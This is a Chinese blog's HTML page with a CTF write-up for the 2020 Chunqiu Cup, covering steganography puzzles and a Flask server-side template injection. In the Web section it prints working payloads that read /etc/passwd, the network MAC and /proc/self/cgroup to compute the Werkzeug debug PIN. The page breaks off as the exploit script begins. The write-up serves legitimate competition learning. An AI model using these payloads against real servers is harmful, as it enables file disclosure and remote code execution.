@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Misccode in morse首先是一个wireshark流量文件分析发现一次upload现象，并且上传文件是被摩斯密码编码的。复制出来，在网站上解码（这里我找了很多解码网站，很多的网站都解码不出来。网址是：）解码后是 1RFIE4RYNBINAUAAAAAGUSSCEKIAAAAEUAAAAA7AIAYAAAAEPFOMTWAAABANUSRCBKR4F53M52F3NWOAMIQ37776">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020年春秋杯新春战“疫”WriteUp">
+<meta property="og:url" content="http://ybm911.work/2020/03/07/i%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9BWriteUp%E2%80%94%E4%B8%BA%E9%80%86%E8%A1%8C%E8%80%85%E5%8A%A0%E6%B2%B9/index.html">
+<meta property="og:site_name" content="Elli0t&#39;s Blog">
+<meta property="og:description" content="Misccode in morse首先是一个wireshark流量文件分析发现一次upload现象，并且上传文件是被摩斯密码编码的。复制出来，在网站上解码（这里我找了很多解码网站，很多的网站都解码不出来。网址是：）解码后是 1RFIE4RYNBINAUAAAAAGUSSCEKIAAAAEUAAAAA7AIAYAAAAEPFOMTWAAABANUSRCBKR4F53M52F3NWOAMIQ37776">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217003127.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217003138.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217003150.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217003204.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217003259.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217003328.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217003227.png">
+<meta property="article:published_time" content="2020-03-06T22:06:15.000Z">
+<meta property="article:modified_time" content="2021-02-16T16:33:32.717Z">
+<meta property="article:author" content="Elli0t">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="WEB">
+<meta property="article:tag" content="Misc">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217003127.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>2020年春秋杯新春战“疫”WriteUp</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="Elli0t's Blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/03/08/apache-%E4%B8%8B%E5%BC%80%E5%90%AFSSI%E9%85%8D%E7%BD%AE%EF%BC%8C%E6%94%AF%E6%8C%81shtml/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/03/04/Docker%E7%9A%84%E4%BD%BF%E7%94%A8/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://ybm911.work/2020/03/07/i%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9BWriteUp%E2%80%94%E4%B8%BA%E9%80%86%E8%A1%8C%E8%80%85%E5%8A%A0%E6%B2%B9/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://ybm911.work/2020/03/07/i%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9BWriteUp%E2%80%94%E4%B8%BA%E9%80%86%E8%A1%8C%E8%80%85%E5%8A%A0%E6%B2%B9/&text=2020年春秋杯新春战“疫”WriteUp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://ybm911.work/2020/03/07/i%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9BWriteUp%E2%80%94%E4%B8%BA%E9%80%86%E8%A1%8C%E8%80%85%E5%8A%A0%E6%B2%B9/&title=2020年春秋杯新春战“疫”WriteUp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://ybm911.work/2020/03/07/i%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9BWriteUp%E2%80%94%E4%B8%BA%E9%80%86%E8%A1%8C%E8%80%85%E5%8A%A0%E6%B2%B9/&is_video=false&description=2020年春秋杯新春战“疫”WriteUp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2020年春秋杯新春战“疫”WriteUp&body=Check out this article: http://ybm911.work/2020/03/07/i%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9BWriteUp%E2%80%94%E4%B8%BA%E9%80%86%E8%A1%8C%E8%80%85%E5%8A%A0%E6%B2%B9/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://ybm911.work/2020/03/07/i%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9BWriteUp%E2%80%94%E4%B8%BA%E9%80%86%E8%A1%8C%E8%80%85%E5%8A%A0%E6%B2%B9/&title=2020年春秋杯新春战“疫”WriteUp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://ybm911.work/2020/03/07/i%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9BWriteUp%E2%80%94%E4%B8%BA%E9%80%86%E8%A1%8C%E8%80%85%E5%8A%A0%E6%B2%B9/&title=2020年春秋杯新春战“疫”WriteUp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://ybm911.work/2020/03/07/i%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9BWriteUp%E2%80%94%E4%B8%BA%E9%80%86%E8%A1%8C%E8%80%85%E5%8A%A0%E6%B2%B9/&title=2020年春秋杯新春战“疫”WriteUp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://ybm911.work/2020/03/07/i%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9BWriteUp%E2%80%94%E4%B8%BA%E9%80%86%E8%A1%8C%E8%80%85%E5%8A%A0%E6%B2%B9/&title=2020年春秋杯新春战“疫”WriteUp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://ybm911.work/2020/03/07/i%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9BWriteUp%E2%80%94%E4%B8%BA%E9%80%86%E8%A1%8C%E8%80%85%E5%8A%A0%E6%B2%B9/&name=2020年春秋杯新春战“疫”WriteUp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://ybm911.work/2020/03/07/i%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9BWriteUp%E2%80%94%E4%B8%BA%E9%80%86%E8%A1%8C%E8%80%85%E5%8A%A0%E6%B2%B9/&t=2020年春秋杯新春战“疫”WriteUp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#code-in-morse"><span class="toc-number">1.0.1.</span> <span class="toc-text">code in morse</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A3%81%E7%9B%98%E5%A5%97%E5%A8%83-Adolph"><span class="toc-number">1.0.2.</span> <span class="toc-text">磁盘套娃 | Adolph</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Flaskapp-timekeeper"><span class="toc-number">2.0.1.</span> <span class="toc-text">Flaskapp(timekeeper)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8-timekeeper"><span class="toc-number">2.0.2.</span> <span class="toc-text">盲注(timekeeper)</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">2.0.2.0.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        2020年春秋杯新春战“疫”WriteUp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Eli0t</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-03-06T22:06:15.000Z" itemprop="datePublished">2020-03-06</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link-link" href="/tags/Misc/" rel="tag">Misc</a>, <a class="tag-link-link" href="/tags/WEB/" rel="tag">WEB</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h4 id="code-in-morse"><a href="#code-in-morse" class="headerlink" title="code in morse"></a>code in morse</h4><p>首先是一个wireshark流量文件分析发现一次upload现象，并且上传文件是被摩斯密码编码的。复制出来，在网站上解码（这里我找了很多解码网站，很多的网站都解码不出来。网址是：）<br>解码后是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RFIE4RYNBINAUAAAAAGUSSCEKIAAAAEUAAAAA7AIAYAAAAEPFOMTWAAABANUSRCBKR4F53M52F3NWOAMIQ37776R5GE6YNAWJPUA4ZBZM6M5ZPRVWIURUHGMBRAMU7T3P57X776PP5DOBIQIXQE2RCZC5EYFWBAESRALQNACALVNE4B2TCABEA4XIZQAVKFXW632O3XS5HZT7R2J747545E4Y7K6HJA7WI5Y62W4OH7HJ75RL2VOMUMN2OOXOWU7RXV7U6D7AFC2X6TBGSDQII3ABOUCCARS2Q7CAATKD2HRTI6JKAZNIXYGK3ZO4POZENG566RDQVSAKWF26VLJJPC5VD2FAATKAMCHTP27Y5IKTWNNAKLVNEPUXLH6XVICOQMXGHEPDBYZYXZ2R6KKTU7ZF7X2CBGUXSOSHICOPIPQCJNAT3JO5ND5OHLBW5BF4CWNI5BFKTERWIUWFZYKVVKURWS7PI4FEXURAUFXBD6JQKSPZFJ7EXRCPEUSHJMS7GVKVDOG7W6F4ZL4XILUVCKWGFZ3KV2I5WBR7R2QALVHNSEWCKDCIXCA3VJU2QAJVCUZSO3LZICZJAASKAD2LKQ6BLVPQLUDSDLFPZP2WOTPLVLNABG7SPICMT3K52QLTWK3Y4NBXIMX5NRKJIA5FLO6Y3LVP55BPDITRVN2UYEZ33ERFZ2R4KTFVJVECKKRXKA2LRCKQFHEAIEAKZWYCKXRXLGJYJXQKZ445HWLUPAFGIC7FV46SB5MERIYNWSHUCNUQP5OB4S2BDQ7627HULZQRW3QYNKQKU3VHCNJSU6E36IUEPU2TBGKZOSB22N2R6TPY7XUG32VIXLTHGHJXGWNWMTJOGFMAJHOVWIIGDSG2KOONGK7UDFQS4ZOK2OAXKAXWZRTOTZQ2Q7CKRKRWAK6IAK2SRYLT72DGHQXRJGGDN57EJBZ2M7VJHOGJKEHU5ASU2KKTFB4SW5MB5C4YR4SSKNON3XLSS6K7CGJKAZNIP6E7RVUY6OFIBTTXYREMWKWPIDKRPTJSMRJPUXKUOWT5IZP3HEJ65OYVILIUGUI2QHGH32VAAXKO23H2BTIAF2UF4QESSANVEKPILOY63ZA5GUZRLLCIQSY6IRWLSTWULC5KBRAFOQPPEED3VB6IKKDRSN2FF4UVXS7KT6TUQCRQZ2DXZS5AYOCLLHKK6I2JUPRSK2HVI3YKBTZXWQDNGI3FMYHFMO3BIYABKUPTFSK3J4KKPKNALUMP5NFERHUB3I7IWTXQEAAMQUPQGRADFFIMKQ3MQNX3BW7NU4WMITZDB5D3FP3VHD2SPCX65ZVL44VUHQMAHMZLQFKADBFIO2RRKTCDYZJ2BCENKZ2LY2TIKSH3MMU3EUB5T26E4TP4NK3F6KRSTI3TEKTBKXTJYKHQATMWUDXT5T4CUYXK6U5H2LYAKUO5LJIFS2QY4O7KZP3KBCODRBAGLKPDN5WUTLOAKEOJP22CBGU6GXYJUPRTXXHKJLP7D46I2TPFLWQRJ4NIEFDYSNKDYFCERFHAC5NIWXVQXELIUSGKLKZLGT36JMOS7IIPBU76KXNQDJV4ZSXCE7F5P4U4QIRAKPAWRQFJLVHRFJDKIVLAVFOORM7F5S3U5D6AIFDV27JYJ243PIM6UKVSGLKQIZACNKPHVJAQJNPUAWACJNAWYEJBR2Q6LTA3STOLSLO6QZFKQ5QGFEZ5TKCJJ6VKBVNVO7DKG27T3HHJDRVXTPD6H7EW6FI6QB5GHQVKU3VP54TBBQMIDFJ6QFKRZXP4UE2QG3EVJDK3AASKBCE5W3VDHVB4JVC7IXOG5C7J4MZWSRDJFSHKH626LIUGRPZ6T2SEANVP5KDXFNKGQIWQS5J5MC5HBH5GGTHZLGWXKOWSCRQNULFGO4C3ZHUZF6O57K4YV2VYUR5BF3PDMEKR7JZEZJAAEUUORJ32GSHIAG4OWQS5LPPKVU2J7P5AQUQWRK7HE5BX3UWXJNPSKKBICC5Z5Y5L7AESSANUYPUNR2USESHE2ORQMJ5H6KTB6YSTVZD3FA6NLBUASWRM6VZYTXV6E4J6SW2XLZ6RGW7JL5FECJ53N7KRKRXMJGKVJTH6FNIFIOOA26AFHEAXJCUAQGBON2UPZNMBRKW7ZKUDZFYMCQBE5B4SUCTJ6TIOOT6J2XVXXLVRMPT3VGQUCSIAU4DKFJ7535XXUWGDSV3DJHQ2SXK3PILDELUPQVAVKFKJQM2GO47WTXXIZQPKNAE2VSDIDGT2VSSNUFSQAJV7WEY2WKVFSQANMFERVARSSUGEJ7TZLISVGYVPGPSVZTRTRYZXVI6VNNIZ6LFNPL2VAQVECPVZYLF3BR2M2PCXAF5USD6UVR7STM27OSOM7D3XUU2RZD5KWOKSBKIKLW3Q6VCIJTFVJLQDBREGECQBDKTJETLKU5KYQJVABNCATKD4MCVP6G75HT2V4CPQSW64SMM2VIBS2Q65ENEIBIETVJ5MFEFVLPEZXG3JEXX4QXSSUAABGMN67M5CJJVGTWUOS7742UGJK6VG2TGVFVCIYCUE2L44E2VBFJHTFNT7URWE6HSIZ2PF5TR7QST3FEAXIWSCMJO4V74VEACNKEGJF3B2IDGRF3BRAYWTALFVCFR7IZCNGVDEUSAZURUGABG5H6TDDKNEVH4TWZC2DI6FR6XT6W64SDC2JY3WDEXTLOK4ZBKPEXZMPFC4RFCFU5KQ6AEDV6T2MGAJ7HUQQUXSPY2U6VFNR3YDVWWKLK54UE2RPPUBGUJHDZ5SGMUY563JFZIRAPIXIGHLD2Q5IMUQOWIGOS2OADI4FPZ3GPJHQV2BU74SW6AUSPXX57VPJ24ZFJ7FNQIURSX6KQZGLKPDN5TLRKZZEGEN6K7T65EHP2X7E54M4AZQVRPFHRVDOZBLVAJFSHUPIVMTKKFUF4C2X7FBGUNWESTWFYXM37PZIBXQMWUERWUSQTFVD65OZR7YZBUACNIP46K3EQXWY5SUSIYGESUH3NLI6FI6DAFNUHQD5KLADK23QWSXWV4UE2RTF6HNMZWTVLVVZMN6NGKXOPO7AKI7ZO2AYBGV7YFMMCAQKQ65D6VINJOPMPKVO3XS73ICKETFERWLKCFX5YEYQA566QZJPETH7AKRZBJPENQNUWN4K2DYTNLWDKPY2WKGMDCIC5QRQUSO42ZPETOUO3VHUIJSVHSN3UXZ2B6OR6ZYB2J4KX5W6QRKB5QMEKQQVTTVO2LJYMULY2WDFFQWROXMWUELDVPZBIDFVAWQFLR6AJ6POOEHBW2U4UDC7S2FRU4VC47P3WQJ4BROGKLYQXSVIHLE7ZXAIKID2LZFB5JHV4NIAKQCAJFGYXI3AEAXI2JYDRGUDCMBJIR7ABXO3NF6UIUKCLNAAAAAACJIVHEJLSCMCBA</span><br></pre></td></tr></table></figure>
+<p>发现是base32加密，于是再一次在网站上解密，附上网站链接：<a target="_blank" rel="noopener" href="http://www.tomeko.net/online_tools/base32.php?lang=en">http://www.tomeko.net/online_tools/base32.php?lang=en</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217003127.png" alt="base32"></p>
+<p>直接复制16进制到Hex fiend，以png文件保存。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217003138.png" alt="1"></p>
+<p>到这里我就被卡住了，再一次是网站的原因（有些网站识别不出来，有些就行）。直接扫描这个奇怪的二维码，出来一个网址，从网址得到一张图片。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217003150.jpg" alt="1yPXJ1"></p>
+<p>再次卡住。py一下得知是F5隐写（还是题目做的太少了，这个以前都没有遇到过），github上有针对F5隐写的<a target="_blank" rel="noopener" href="https://github.com/matthewgao/F5-steganography">脚本</a><br>脚本使用方法：<code>java Extract 123456.jpg -p 123456</code><br>但是这张图片没有密码，所以直接<code>java Extract 1yPXJ1.jpg</code>，后会生成output.txt文件，里面就有flag了。</p>
+<h4 id="磁盘套娃-Adolph"><a href="#磁盘套娃-Adolph" class="headerlink" title="磁盘套娃 | Adolph"></a>磁盘套娃 | Adolph</h4><p>见我的另一篇文章，专门写了一下。</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h4 id="Flaskapp-timekeeper"><a href="#Flaskapp-timekeeper" class="headerlink" title="Flaskapp(timekeeper)"></a>Flaskapp(timekeeper)</h4><p>题目涉及知识点<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/aef2ae0498df">ssti（模板注入）</a>、python调试打开导致PIN可计算。<br>在/decode下让其出现报错，进入debug模式（泄露部分源码）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 : &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">        res =  render_template_string(tmp)</span><br><span class="line">        flash(res)</span><br></pre></td></tr></table></figure>
+<p><strong>此处错误使用render_template_string，所以存在ssti模板注入。</strong><br>验证如下</p>
+18 base64 结果为 e3s5Kzl9fQ==，但该应用程序解密的结果为 18
+<p>然后就是常规SSTI步骤，但发现过滤了很多字符，像system、popen等系统命令函数都被过滤<br>既然不能命令执行就尝试读取文件<br>flask读取文件的payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217003204.png" alt="flask_payload"></p>
+<p>但是由于未知flag存放位置，所以就尝试获取pin计算的关键信息。<br>PIN 机制在<a target="_blank" rel="noopener" href="https://www.cnblogs.com/HacTF/p/8160076.html">Flask debug 模式 PIN 码生成机制安全性研究笔记
+</a>一文中有详细的研究。<br>生成PIN的关键值有如下几个</p>
+<ul>
+<li><ol>
+<li>服务器运行flask所登录的用户名。 通过/etc/passwd中可以猜测为flaskweb 或者root ，此处用的flaskweb</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>modname 一般不变就是flask.app</li>
+</ol>
+</li>
+<li><ol start="3">
+<li>getattr(app, “__name__”, app.__class__.__name__)。python该值一般为Flask 值一般不变</li>
+</ol>
+</li>
+<li><ol start="4">
+<li>flask库下app.py的绝对路径。通过报错信息就会泄露该值。本题的值为 /usr/local/lib/python3.7/site-packages/flask/app.py</li>
+</ol>
+</li>
+<li><ol start="5">
+<li>当前网络的mac地址的十进制数。通过文件/sys/class/net/eth0/address eth0为当前使用的网卡<img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217003259.png" alt="flask_eth0">获取Mac地址：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/sys/class/net/eth0/address&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><ol start="6">
+<li>最后一个就是机器的id。<br>对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_i<img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217003328.png" alt="flask_linux_id">，有的系统没有这两个文件，windows的id获取跟linux也不同。<br>对于docker机则读取/proc/self/cgroup：<br>获取machine-id：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/proc/self/cgroup&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">11:memory:&#x2F;docker&#x2F;9e06b8a1d939b2125978fb9393e8a021553002ee0a876e6da648099ec3b10d53</span><br><span class="line">10:blkio:&#x2F;docker&#x2F;9e06b8a1d939b2125978fb9393e8a021553002ee0a876e6da648099ec3b10d53</span><br><span class="line">9:cpu,cpuacct:&#x2F;docker&#x2F;9e06b8a1d939b2125978fb9393e8a021553002ee0a876e6da648099ec3b10d53</span><br><span class="line">8:devices:&#x2F;docker&#x2F;9e06b8a1d939b2125978fb9393e8a021553002ee0a876e6da648099ec3b10d53</span><br><span class="line">7:cpuset:&#x2F;docker&#x2F;9e06b8a1d939b2125978fb9393e8a021553002ee0a876e6da648099ec3b10d53</span><br><span class="line">6:hugetlb:&#x2F;docker&#x2F;9e06b8a1d939b2125978fb9393e8a021553002ee0a876e6da648099ec3b10d53</span><br><span class="line">5:freezer:&#x2F;docker&#x2F;9e06b8a1d939b2125978fb9393e8a021553002ee0a876e6da648099ec3b10d53</span><br><span class="line">4:perf_event:&#x2F;docker&#x2F;9e06b8a1d939b2125978fb9393e8a021553002ee0a876e6da648099ec3b10d53</span><br><span class="line">3:net_cls,net_prio:&#x2F;docker&#x2F;9e06b8a1d939b2125978fb9393e8a021553002ee0a876e6da648099ec3b10d53</span><br><span class="line">2:pids:&#x2F;docker&#x2F;9e06b8a1d939b2125978fb9393e8a021553002ee0a876e6da648099ec3b10d53</span><br><span class="line">1:name&#x3D;systemd:&#x2F;docker&#x2F;9e06b8a1d939b2125978fb9393e8a021553002ee0a876e6da648099ec3b10d53</span><br></pre></td></tr></table></figure>
+其中的 9e06b8a1d939b2125978fb9393e8a021553002ee0a876e6da648099ec3b10d53 这个值就是machine id。<br>至此所有关键值都获取完毕剩下的就是计算PIN值<br>计算PIN值的关键代码在Lib\site-packages\werkzeug\debug\<em>_init_</em>.py<br>提出来代码（kingkk师傅的exp）如下<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2553">Flask debug pin安全问题中的exp</a></li>
+</ol>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 